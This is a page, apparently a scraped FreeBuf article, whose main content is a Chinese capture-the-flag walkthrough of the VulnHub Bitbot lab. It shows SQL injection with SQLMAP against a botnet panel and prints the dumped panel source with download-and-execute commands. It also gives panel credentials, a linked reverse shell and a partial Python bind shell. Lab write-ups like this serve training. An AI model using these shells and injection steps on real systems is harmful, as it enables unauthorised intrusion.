@@ -1,0 +1,662 @@
+<head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> </head><script src="static/js/header/jquery.min.js?ver=3.6.1" type="text/javascript"></script>
+<script src="static/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1" type="text/javascript"></script>
+<script src="static/js/highslide/highslide-with-html.packed.js" type="text/javascript"></script>
+<script type="text/javascript">
+jQuery(document).ready(function($) {
+    hs.graphicsDir = "static/buf/plugins/auto-highslide/images/graphics/";
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.addSlideshow({
+        interval: 5000,
+        repeat: true,
+        useControls: true,
+        fixedControls: "fit",
+        overlayOptions: {
+            opacity: 0.75,
+            position: "bottom center",
+            hideOnMouseOut: true
+
+        }
+
+    });
+});
+</script>
+<script language="JavaScript" src="static/buf/plugins/cartpauj-pm/js/script.js" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/layer.js"></script>
+<script src="static/buf/plugins/simditor/highlight/highlight.pack.js" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
+<script src="static/buf/themes/freebuf/js/bootstrap.min.js"></script>
+<script src="static/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
+<script src="static/js/focus/bjqs-1.3.min.js" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript"></script>
+<script src="static/js/new/setint.js" type="text/javascript"></script>
+<script src="static/js/colum/swiper-3.4.2.min.js"></script>
+<script type="application/ecmascript">
+    $('.icon-wechat').hover(function(){
+        $('.wechatImgdiv').show()
+    },function(){
+        $('.wechatImgdiv').hide()
+    })
+</script>
+<script src="static/js/header/header.js" type="text/javascript"></script>
+<script>
+		jQuery(window).load(function () {
+			jQuery(".main-header").sticky({topSpacing: 0});
+		});
+	</script>
+<script>
+                    $('.user-detial .test-info').mouseover(function() {
+                        var _title = $(this).find('.text').attr('data-title');
+                        if (_title) {
+                            var str = '<span class="text-title">' + _title + '</span>';
+                            $(this).append(str);
+                        }
+                    }).mouseout(function() {
+                        $('.user-detial .test-info .text-title').remove();
+                    });
+                </script>
+<script type="text/javascript">
+				jQuery("#pagination a").live("click", function () {
+					var _url = jQuery(this).attr("href");
+					jQuery(this).parents("li").addClass("current").blur().parents("#menupage").find("li").not(jQuery(this).parents("li")).removeClass("current");
+					jQuery.ajax({
+						type: "POST",
+						url: _url + "#timeline",
+						success: function (data) {
+							result = jQuery(data).find("#timeline .news_inner");
+							nextHref = jQuery(data).find("#pagination a").attr("href");
+							if (nextHref != undefined) {
+								jQuery("#pagination a").attr("href", nextHref);
+							} else {
+								jQuery("#pagination").remove();
+							}
+							jQuery(function () {
+								if (_url.indexOf("page") < 1) {
+									jQuery("#timeline").html('');
+								}
+								jQuery("#timeline").append(result.fadeIn(200));
+							});
+						}
+					});
+					return false;
+				});
+			</script>
+<script>
+    $('.star_score > a').click(function() {
+        $(this).addClass('active');
+        $(this).siblings().removeClass('active');
+    });
+    $('.star_score > a').hover(function() {
+        $(this).siblings().removeClass('active');
+    });
+    $(document).on('click', function() {
+        $('.bottom_tools .tips-wrap').hide(500);
+    });
+    $('.bottom_tools ul li.fb-tips').click(function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $(this).find('.tips-wrap').toggle(500);
+    });
+    $('.bottom_tools .tips-wrap').click(function(event) {
+        var evt = evt || event;
+        evt.stopPropagation();
+        $(this).show();
+    });
+    $('.feedback').on('click',function () {
+        var content = $('#feedback-content').val();
+        if(!content){
+            $('#feedback-content').focus();
+            $('.feedback-error').text('反馈内容不能为空！').show();
+            return;
+        }
+        var contact = $('#feedback-contact').val();
+        if(!contact){
+            $('#feedback-contact').focus();
+            $('.feedback-error').text('联系方式不能为空！').show();
+            return;
+        }
+        var score = $('.star_score').children('.active').attr('data-id')
+        if(!score){
+            $('.feedback-error').text('给FreeBuf打个分吧！').show();
+            return;
+        }
+        var yzm = $('#yzm').val();
+        var _url = 'static/verify';
+        $.ajax({
+            type: "post",
+            url: _url,
+            data: {'content':content,'contact':contact,'score':score,'feedback_status':1,'yzm':yzm},
+            success: function (data) {
+                $("#captcha").trigger('click')
+                if(data.code ==200){
+                    layer.open({
+                        title: '系统提示',
+                        btnAlign: 'c',
+                        content: data.msg,
+                        area: '278px',
+                    });
+                }else {
+                    layer.open({
+                        title: '系统提示',
+                        btnAlign: 'c',
+                        content: data.msg,
+                        area: '278px',
+                    });
+                }
+            },
+        })
+    })
+
+    $(document).on('click', '.appeal-wrap-public .appeal-main', function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $('.appeal-wrap-public').show();
+    });
+    $(document).on('click', '.appeal-main .close', function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $('.appeal-wrap').hide();
+    });
+    $(document).on('click', '.appeal-main .appeal-footer .btn-sure', function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $('.appeal-wrap-public').hide();
+    });
+
+    $('.complain').on('click',function () {
+        var _url = 'static/verify';
+        var token = $('#complain_token').val();
+        $.ajax({
+            type: "post",
+            url: _url,
+            data: {'complain_token':token,'complain_status':1},
+            success: function (data) {
+            },
+        })
+    })
+</script>
+<script src="static/js/new/backtop.js"></script>
+<script type="text/javascript">
+jQuery(function(){	
+	jQuery('.tabPanes ul li').click(function(){
+		jQuery(this).addClass('hit').siblings().removeClass('hit');
+		jQuery('.panesl>div:eq('+jQuery(this).index()+')').show().siblings().hide();	
+	})
+	jQuery('.vulbox-nav').click(function(e) { 
+        e.stopPropagation(); 
+    });  
+})
+</script>
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fcc53db168808048541c6735ce30421f5' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+jQuery(function() {
+    jQuery(".simditor pre").each(function(i, block){
+        hljs.highlightBlock(block);    
+    });
+    hljs.initHighlightingOnLoad();
+});
+</script>
+<script>
+/* <![CDATA[ */
+var rcGlobal = {
+	serverUrl		:'static',
+	infoTemp		:'%REVIEWER% on %POST%',
+	loadingText		:'Loading',
+	noCommentsText	:'No comments',
+	newestText		:'&laquo; 最新',
+	newerText		:'&laquo; 新一点',
+	olderText		:'旧一点 &raquo;',
+	showContent		:'1',
+	external		:'1',
+	avatarSize		:'32',
+	avatarPosition	:'left',
+	anonymous		:'Anonymous'
+};
+/* ]]> */
+</script>
+<script src="static/js/recentcomments/wp-recentcomments-jquery.js?ver=2.2.3" type="text/javascript"></script>
+
+<link href="static/buf/plugins/wp-favorite-posts/wpfp.css" id="wpfp-css" rel="stylesheet" type="text/css"/>
+<link href="static/css/recentcomments/wp-recentcomments.css?ver=2.2.3" id="wp-recentcomments-css" media="screen" rel="stylesheet" type="text/css"/>
+<link href="static/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1" id="mycred-widget-css" media="all" rel="stylesheet" type="text/css"/>
+<link href="static/css/highslide/highslide.css" rel="stylesheet" type="text/css"/>
+<link href="static/buf/plugins/cartpauj-pm/style/style.css" rel="stylesheet" type="text/css"/>
+<link href=" static/buf/plugins/simditor/highlight/styles/default.css" rel="stylesheet" type="text/css"/>
+<link href="https://static.freebuf.com/images/favicon.ico" rel="shortcut icon"/>
+<link href="static/css/new/header.css" rel="stylesheet"/>
+<link href="static/css/new/bootstrap.min.css?ver=2016051701" media="screen" rel="stylesheet"/>
+<link href="static/css/new/swiper-3.4.2.min.css" rel="stylesheet" type="text/css"/>
+<link href="static/css/new/style.css?ver=2018112123749359438534" rel="stylesheet" type="text/css"/>
+
+<div id="contenttxt">
+                            <h1>下载地址</h1>
+<pre>https://download.vulnhub.com/botchallenges/Bitbot.VulnVM-disk1.vmdk.7z
+</pre>
+<h1><b>实战演练</b></h1>
+<p>下载下来之后，把它添加硬盘上去</p>
+<p><img alt="image.png" data-original="images/20190804/1564876517_5d461ee579c3d.png" src="images/20190804/1564876517_5d461ee579c3d.png" width="745" height="717" /></p>
+<noscript><img alt="image.png" src="images/20190804/1564876517_5d461ee579c3d.png" width="745" height="717" /></p></noscript>
+<p>使用netdiscover进行查找靶机的IP</p>
+<p><span><img alt="image.png" data-original="images/20190804/1564876707_5d461fa316f04.png" src="images/20190804/1564876707_5d461fa316f04.png" width="885" height="238" />使用nmap对靶机系统进行端口扫描</span></p>
+<noscript><img alt="image.png" src="images/20190804/1564876707_5d461fa316f04.png" width="885" height="238" />使用nmap对靶机系统进行端口扫描</span></p></noscript>
+<p><span><img alt="image.png" data-original="images/20190804/1564876815_5d46200fefb23.png" src="images/20190804/1564876815_5d46200fefb23.png" width="932" height="306" />打开浏览器</span></p>
+<noscript><img alt="image.png" src="images/20190804/1564876815_5d46200fefb23.png" width="932" height="306" />打开浏览器</span></p></noscript>
+<p><span><img alt="image.png" data-original="images/20190804/1564876899_5d4620635c851.png" src="images/20190804/1564876899_5d4620635c851.png" width="833" height="352" /><br /></span></p>
+<noscript><img alt="image.png" src="images/20190804/1564876899_5d4620635c851.png" width="833" height="352" /><br /></span></p></noscript>
+<p>有一个超链接的指引，不过是403</p>
+<p><img alt="image.png" data-original="images/20190804/1564876926_5d46207e26d21.png" src="images/20190804/1564876926_5d46207e26d21.png" width="799" height="386" />爆破web目录，找到了一个admin.php</p>
+<noscript><img alt="image.png" src="images/20190804/1564876926_5d46207e26d21.png" width="799" height="386" />爆破web目录，找到了一个admin.php</p></noscript>
+<p><img alt="image.png" src="images/20190804/1564877038_5d4620eef2c49.png" width="946" height="965" /><img alt="image.png" data-original="images/20190804/1564877074_5d46211286273.png" src="images/20190804/1564877074_5d46211286273.png" width="1200" height="582" />SQLMAP走起</p>
+<noscript><img alt="image.png" src="images/20190804/1564877038_5d4620eef2c49.png" width="946" height="965" /><img alt="image.png" src="images/20190804/1564877074_5d46211286273.png" width="1200" height="582" />SQLMAP走起</p></noscript>
+<pre>POST /admin.php HTTP/1.1
+Host: 192.168.0.101
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Referer: http://192.168.0.101/admin.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Connection: close
+Cookie: PHPSESSID=pplr8tr3t0333j40ku6k9uq7r7
+Upgrade-Insecure-Requests: 1
+
+login=1&amp;username=1&amp;password=1</pre>
+<p>不过是失败的=-=</p>
+<p><img alt="image.png" data-original="images/20190804/1564877163_5d46216b0ab38.png" src="images/20190804/1564877163_5d46216b0ab38.png" width="993" height="519" />根据这个靶机的wiki找到了一个页面存在SQL注入漏洞</p>
+<noscript><img alt="image.png" src="images/20190804/1564877163_5d46216b0ab38.png" width="993" height="519" />根据这个靶机的wiki找到了一个页面存在SQL注入漏洞</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564877784_5d4623d80f9db.png" src="images/20190804/1564877784_5d4623d80f9db.png" width="736" height="474" />对这个页面进行注入</p>
+<noscript><img alt="image.png" src="images/20190804/1564877784_5d4623d80f9db.png" width="736" height="474" />对这个页面进行注入</p></noscript>
+<p><span style="color:rgb(55,55,55);"></span></p>
+<p><code></code>
+<p><code><span style="color:rgb(55,55,55);">gate2.php?windows=Windows&amp;country=US&amp;hwid=101&amp;connection=0&amp;version=100&amp;btc=all&amp;sysinfo=Some+Info</span><br /></code></p>
+<p><code></code>
+<p><code></code></p>
+<p><code></code>
+<p><span style="color:rgb(55,55,55);">有两个参数存在注入<br /><img alt="image.png" data-original="images/20190804/1564878159_5d46254f912e0.png" src="images/20190804/1564878159_5d46254f912e0.png" width="1200" height="933" /></span></p>
+<noscript><img alt="image.png" src="images/20190804/1564878159_5d46254f912e0.png" width="1200" height="933" /></span></p></noscript>
+<p><span style="color:rgb(55,55,55);">查看admin.php文件</span></p>
+<p><span style="color:rgb(55,55,55);"><img alt="image.png" data-original="images/20190804/1564878297_5d4625d9cb3e4.png" src="images/20190804/1564878297_5d4625d9cb3e4.png" width="1200" height="1008" />admin.php</span></p>
+<noscript><img alt="image.png" src="images/20190804/1564878297_5d4625d9cb3e4.png" width="1200" height="1008" />admin.php</span></p></noscript>
+<pre>root@kali:~# cat /root/.sqlmap/output/192.168.0.101/files/_var_www_admin.php
+&lt;?php
+require_once 'config.php';
+include 'loginheader.php';
+include 'header.php';
+include 'submit.php';
+echo'
+&lt;table class="tborder" border="0" cellpadding="4" cellspacing="0" style=""&gt;
+
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;td class="thead" colspan="8"&gt;
+&lt;div&gt;&lt;strong&gt;Bot List&lt;/strong&gt;&lt;/div&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody style="" id="cat_1_e"&gt;
+&lt;tr&gt;
+&lt;td class="tcat" style="white-space: nowrap;" align="center" width="20"&gt;&lt;span class="smalltext"&gt;&lt;strong&gt;ID&lt;/strong&gt;&lt;/span&gt;&lt;/td&gt;
+&lt;td class="tcat" style="white-space: nowrap;" align="center" width="50"&gt;&lt;span class="smalltext"&gt;&lt;strong&gt;IPv4 Address&lt;/strong&gt;&lt;/span&gt;&lt;/td&gt;
+&lt;td class="tcat" style="white-space: nowrap;" align="center" width="60"&gt;&lt;span class="smalltext"&gt;&lt;strong&gt;Operation System&lt;/strong&gt;&lt;/span&gt;&lt;/td&gt;
+&lt;td class="tcat" style="white-space: nowrap;" align="center" width="60"&gt;&lt;span class="smalltext"&gt;&lt;strong&gt;Cores&lt;/strong&gt;&lt;/span&gt;&lt;/td&gt;
+&lt;td class="tcat" style="white-space: nowrap;" align="center" width="50"&gt;&lt;span class="smalltext"&gt;&lt;strong&gt;GPU&lt;/strong&gt;&lt;/span&gt;&lt;/td&gt;
+&lt;td class="tcat" style="white-space: nowrap;" align="center" width="60"&gt;&lt;span class="smalltext"&gt;&lt;strong&gt;Mining Status&lt;/strong&gt;&lt;/span&gt;&lt;/td&gt;
+&lt;td class="tcat" style="white-space: nowrap;" align="center" width="60"&gt;&lt;span class="smalltext"&gt;&lt;strong&gt;Outgoing command&lt;/strong&gt;&lt;/span&gt;&lt;/td&gt;
+&lt;td class="tcat" style="white-space: nowrap;" align="center" width="50"&gt;&lt;span class="smalltext"&gt;&lt;strong&gt;Status&lt;/strong&gt;&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;';
+
+$startlimit = '0';
+
+if (isset($_GET['botlist']) &amp;&amp; isset($_GET['page']) &amp;&amp; isset($_GET['last']))
+{
+	if (intval($_GET['page']) == 1)
+	{	
+	$startlimit = 0;
+	}
+	else
+	{
+	$startlimit = intval($_GET['last']);
+	}
+}
+
+	if ($SQL_CONNECTION)
+	{
+		
+
+		mysql_select_db($SQL_DATABASE,$SQL_CONNECTION);
+		$sql = "SELECT * FROM `bots` WHERE dead = '1' ORDER by id limit " . $startlimit . "," . "$BOT_PAGE_MAX";
+
+		$query = mysql_query($sql);
+			
+		while($row = mysql_fetch_assoc($query))
+		{
+			$dead = $row['dead'];
+			$hwid = $row['hwid'];
+			$id = $row['id'];
+			$cmd = $row['cmd'];
+			$ip = $row['ip'];
+			$win = $row['win'];
+			$now = strtotime(date('Y-m-d H:i:s'));
+			$online = strtotime($row['online']);
+			$min = $BOT_CHECKIN_INTERVAL;
+			$gap = $now - $min;
+			if($online &gt;= $gap){ $active = '&lt;font color="#00CC00"&gt;Online&lt;/font&gt;';} else{ $active = '&lt;font color="#FF0000"&gt;Offline&lt;/font&gt;'; mysql_query("update `bots` set `btc` = '0' where `hwid` = '$hwid'");};
+			$version = $row['version'];
+			$cpugpu = explode(" ",$row['sysinfo']);
+			$cpu = $cpugpu[0];
+			$gpu = $cpugpu[1];
+			$btc = $row['btc'];
+			echo '&lt;tr&gt;&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;' . $id . '&lt;/td&gt;'.
+				'&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;' . $ip . '&lt;/td&gt;'.
+				'&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;' . $win . '&lt;/td&gt;'.
+				'&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;' . $cpu . '&lt;/td&gt;'.
+				'&lt;td class="trow1" style="white-space: nowrap; max-width: 100px; overflow:hidden;" align="center"&gt;' . $gpu . '&lt;/td&gt;'.
+				'&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;'; if($btc == "1"){echo "Yes";} else{ echo "No"; }; echo '&lt;/td&gt;'.
+				'&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;' . $cmd . '&lt;/td&gt;'.
+				'&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;' . $active . '&lt;/td&gt;&lt;tr&gt;';
+		}
+	}
+
+echo '
+&lt;/tbody&gt;
+&lt;/table&gt;';
+
+$sql = "SELECT * FROM `bots`";
+$query = mysql_query($sql);
+$rows = round(mysql_numrows($query) / intval($BOT_PAGE_MAX), 0) + 1;
+$lastint = 0;
+for($i=1;$i&lt;$rows;$i++)
+{
+	echo '&lt;a href="./admin.php?botlist=1&amp;page=' . $i . '&amp;last=' . ($lastint * intval($BOT_PAGE_MAX)) . '"&gt;' . $i . ',&lt;/a&gt;';
+	$lastint++;
+} 
+
+echo '&lt;br&gt;&lt;br&gt;
+
+&lt;table class="tborder" border="0" cellpadding="4" cellspacing="0"&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;td class="thead" colspan="3"&gt;
+&lt;div&gt;&lt;strong&gt;Add Command&lt;/strong&gt;&lt;/div&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody style="" id="cat_1_e"&gt;
+&lt;tr&gt;
+&lt;td class="tcat" style="white-space: nowrap;" align="center"&gt;&lt;span class="smalltext"&gt;&lt;strong&gt;Bot ID&lt;/strong&gt;&lt;/span&gt;&lt;/td&gt;
+&lt;td class="tcat" style="white-space: nowrap;" align="center"&gt;&lt;span class="smalltext"&gt;&lt;strong&gt;Command&lt;/strong&gt;&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;
+
+&lt;tr&gt;
+  &lt;form action="admin.php" method="get"&gt;
+  &lt;input name="addcommand" value="1"type="hidden"&gt;
+  
+&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;';		
+echo' &lt;select name="botid" &gt;
+&lt;option value=""&gt;Choose&lt;/option&gt;
+&lt;option value="all"&gt;All&lt;/option&gt;';
+if ($SQL_CONNECTION)
+	{
+		mysql_select_db($SQL_DATABASE,$SQL_CONNECTION);
+		$sql = "SELECT * FROM `bots` ORDER BY id WHERE dead = '1'";
+		$query = mysql_query($sql);
+		while($row = mysql_fetch_assoc($query))
+		{
+    	$id=$row["id"]; 
+  		echo "&lt;OPTION VALUE=".$id."&gt;".$id."&lt;/option&gt;"; 	
+		}
+	} 
+echo'
+&lt;/select&gt; 
+&lt;/td&gt;
+&lt;td class="trow1" white-space: nowrap;" align="Left"&gt;
+&lt;input class="textbox" name="newcommand" style=" width: 85%; margin-top: 4px; margin-left: 15px; margin-right: 15px;" type="text" /&gt;
+				&lt;input class="button" value="Add" type="submit"&gt;&lt;/form&gt;
+&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td class="tcat" style="white-space: nowrap;" align="center"&gt;&lt;span class="smalltext"&gt;&lt;strong&gt;Start ID | Stop ID&lt;/strong&gt;&lt;/span&gt;&lt;/td&gt;
+&lt;td class="tcat" style="white-space: nowrap;" align="center"&gt;&lt;span class="smalltext"&gt;&lt;strong&gt;Command&lt;/strong&gt;&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;
+  &lt;form action="admin.php" method="get"&gt;
+  &lt;input name="addcommand" value="1" type="hidden"&gt;
+  
+&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;';		
+echo' &lt;select name="startid" &gt;
+&lt;option value=""&gt;Choose&lt;/option&gt;';
+if ($SQL_CONNECTION)
+	{
+		mysql_select_db($SQL_DATABASE,$SQL_CONNECTION);
+		$sql = "SELECT * FROM `bots` ORDER BY id";
+		$query = mysql_query($sql);
+		while($row = mysql_fetch_assoc($query))
+		{
+    	$id=$row["id"]; 
+  		echo "&lt;OPTION VALUE=".$id."&gt;".$id."&lt;/option&gt;"; 	
+		}
+	} 
+echo'
+&lt;/select&gt; 		
+&lt;select name="stopid" &gt;
+&lt;option value=""&gt;Choose&lt;/option&gt;';
+if ($SQL_CONNECTION)
+	{
+		mysql_select_db($SQL_DATABASE,$SQL_CONNECTION);
+		$sql = "SELECT * FROM `bots` ORDER BY id";
+		$query = mysql_query($sql);
+		while($row = mysql_fetch_assoc($query))
+		{
+    	$id=$row["id"]; 
+  		echo "&lt;OPTION VALUE=".$id."&gt;".$id."&lt;/option&gt;"; 	
+		}
+	} 
+echo'
+&lt;/select&gt; 
+&lt;/td&gt;
+&lt;td class="trow1" white-space: nowrap;" align="Left"&gt;
+&lt;input class="textbox" name="newcommand" style=" width: 85%; margin-top: 4px; margin-left: 15px; margin-right: 15px;" type="text" /&gt;
+				&lt;input class="button" value="Add" type="submit"&gt;&lt;/form&gt;
+&lt;/td&gt;&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+
+&lt;br&gt;&lt;br&gt;
+
+&lt;-- Command List --&gt;
+
+&lt;table class="tborder" border="0" cellpadding="4" cellspacing="0"&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;td class="thead" colspan="4"&gt;
+&lt;div&gt;&lt;strong&gt;Command List&lt;/strong&gt;&lt;/div&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody style="" id="cat_1_e"&gt;
+&lt;tr&gt;
+&lt;td class="tcat" style="white-space: nowrap;" align="center" width="40"&gt;&lt;span class="smalltext"&gt;&lt;strong&gt;Command&lt;/strong&gt;&lt;/span&gt;&lt;/td&gt;
+&lt;td class="tcat" style="white-space: nowrap;" align="center" width="50"&gt;&lt;span class="smalltext"&gt;&lt;strong&gt;Command Description&lt;/strong&gt;&lt;/span&gt;&lt;/td&gt;
+&lt;td class="tcat" style="white-space: nowrap;" align="center" width="55"&gt;&lt;span class="smalltext"&gt;&lt;strong&gt;Command Options&lt;/strong&gt;&lt;/span&gt;&lt;/td&gt;
+&lt;td class="tcat" style="white-space: nowrap;" align="center" width="60"&gt;&lt;span class="smalltext"&gt;&lt;strong&gt;Command Example&lt;/strong&gt;&lt;/span&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;' . $CMD_DOWNLOAD . '&lt;/td&gt;'.
+'&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt; Downloads and Executes a File&lt;/td&gt;'.
+'&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;' . $CMD_DOWNLOAD . ' [URL]&lt;/td&gt;'.
+'&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;' . $CMD_DOWNLOAD . ' http://www.site.com/file.exe&lt;/td&gt;
+
+&lt;tr&gt;&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;' . $CMD_UPDATE . '&lt;/td&gt;'.
+'&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt; Updates Bot With New File&lt;/td&gt;'.
+'&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;' . $CMD_UPDATE . ' [URL]&lt;/td&gt;'.
+'&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;' . $CMD_UPDATE . ' http://www.site.com/file.exe&lt;/td&gt;
+
+&lt;tr&gt;&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;' . $CMD_REMOVE . '&lt;/td&gt;'.
+'&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt; Removes Bot From System&lt;/td&gt;'.
+'&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;' . $CMD_REMOVE . '&lt;/td&gt;
+&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;' . $CMD_REMOVE . '&lt;/td&gt;
+
+&lt;tr&gt;&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;' . $CMD_STOPBTC . '&lt;/td&gt;'.
+'&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt; Stops Bitcoin mining&lt;/td&gt;'.
+'&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;' . $CMD_STOPBTC . '&lt;/td&gt;
+&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;' . $CMD_STOPBTC . ' &lt;/td&gt;
+
+&lt;tr&gt;&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;' . $CMD_BTC . '&lt;/td&gt;'.
+'&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt; Starts Bitcoin mining&lt;/td&gt;'.
+'&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;' . $CMD_BTC . '&lt;/td&gt;
+&lt;td class="trow1" style="white-space: nowrap;" align="center"&gt;' . $CMD_BTC . ' &lt;/td&gt;
+
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;br&gt;&lt;br&gt;
+
+
+&lt;-- Footer --&gt;';
+
+include 'footer.php';
+
+?&gt;
+root@kali:~# 
+<br /></pre>
+<p>config.php</p>
+<p><img alt="image.png" data-original="images/20190804/1564878472_5d4626888d26b.png" src="images/20190804/1564878472_5d4626888d26b.png" width="1200" height="604" />控制面板登录信息</p>
+<noscript><img alt="image.png" src="images/20190804/1564878472_5d4626888d26b.png" width="1200" height="604" />控制面板登录信息</p></noscript>
+<p><span></span></p>
+<p><code></code>
+<p><code><span>$ADMIN_USER_NAME 	= 'botter'; //panel username</span></code></p>
+<p><code></code>
+<p><code><span>$ADMIN_PASSWORD 	= 'IF I CAME UP WITH UNIQUE PASSWORDS, I WOULD BE HOME BY NOW'; //panel password</span></code></p>
+<p><code></code>
+<p><span></span></p>
+<p><span>登录成功</span></p>
+<p><span><img alt="image.png" data-original="images/20190804/1564878625_5d4627218f6c2.png" src="images/20190804/1564878625_5d4627218f6c2.png" width="1200" height="964" /><br /></span></p>
+<noscript><img alt="image.png" src="images/20190804/1564878625_5d4627218f6c2.png" width="1200" height="964" /><br /></span></p></noscript>
+<p>这里面有可以下载文件的漏洞</p>
+<p><img alt="image.png" data-original="images/20190804/1564878907_5d46283b50a20.png" src="images/20190804/1564878907_5d46283b50a20.png" width="1200" height="466" />下载<a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">反弹shell</a>，修改IP和端口</p>
+<noscript><img alt="image.png" src="images/20190804/1564878907_5d46283b50a20.png" width="1200" height="466" />下载<a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">反弹shell</a>，修改IP和端口</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564879073_5d4628e1130b0.png" src="images/20190804/1564879073_5d4628e1130b0.png" width="645" height="228" />启动http服务器</p>
+<noscript><img alt="image.png" src="images/20190804/1564879073_5d4628e1130b0.png" width="645" height="228" />启动http服务器</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564879162_5d46293aabb29.png" src="images/20190804/1564879162_5d46293aabb29.png" width="948" height="144" />下载shell</p>
+<noscript><img alt="image.png" src="images/20190804/1564879162_5d46293aabb29.png" width="948" height="144" />下载shell</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564879226_5d46297a85ff0.png" src="images/20190804/1564879226_5d46297a85ff0.png" width="1098" height="277" /></p>
+<noscript><img alt="image.png" src="images/20190804/1564879226_5d46297a85ff0.png" width="1098" height="277" /></p></noscript>
+<p>发现不行，好像由于是之前SQLMAP跑的时候，跑死了，我重启了一下靶机</p>
+<p><img alt="image.png" src="images/20190804/1564880252_5d462d7c7663e.png" width="1132" height="867" /><img alt="image.png" data-original="images/20190804/1564880285_5d462d9d6926b.png" src="images/20190804/1564880285_5d462d9d6926b.png" width="1164" height="559" /></p>
+<noscript><img alt="image.png" src="images/20190804/1564880252_5d462d7c7663e.png" width="1132" height="867" /><img alt="image.png" src="images/20190804/1564880285_5d462d9d6926b.png" width="1164" height="559" /></p></noscript>
+<p>有下载记录<br /><img alt="image.png" data-original="images/20190804/1564880461_5d462e4dcbeeb.png" src="images/20190804/1564880461_5d462e4dcbeeb.png" width="690" height="107" /></p>
+<noscript><img alt="image.png" src="images/20190804/1564880461_5d462e4dcbeeb.png" width="690" height="107" /></p></noscript>
+<p>我重新发出了命令，但我仍然无法让它正常工作。</p>
+<p>然后我决定稍微改变一下，而不是尝试执行反向shell，我想我会尝试一个绑定shell，这会打开一个我可以netcat到的端口。</p>
+<p>我使用了以下python bind-shell脚本并将其保存为python-bind.py，然后重新发出命令以上载此文件并执行它。</p>
+<pre>#simple python bind shell
+import os,sys,socket
+ 
+ls = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+print '-Creating socket..'
+port = 31337
+try:
+	ls.bind(('', port))
+	print '-Binding the port on ' 
+	ls.listen(1)
+	print '-Listening, '
+	(conn, addr) = ls.accept()
+	print '-Waiting for connection...'
+	cli= conn.fileno()
+	print '-Redirecting shell...'
+	os.dup2(cli, 0)
+	print 'In, '
